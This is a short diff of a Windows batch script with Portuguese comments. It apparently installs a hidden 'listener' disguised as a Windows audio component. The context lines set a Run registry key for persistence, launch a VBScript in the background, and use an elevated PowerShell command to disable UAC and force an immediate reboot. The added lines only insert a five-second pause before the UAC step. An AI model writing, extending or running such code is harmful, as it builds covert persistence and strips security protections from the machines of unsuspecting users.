@@ -23,5 +23,8 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
 
+:: Aguardar um momento para garantir que o listener iniciou
+timeout /t 5 /nobreak >nul
+
 :: Desabilitar UAC
 powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"
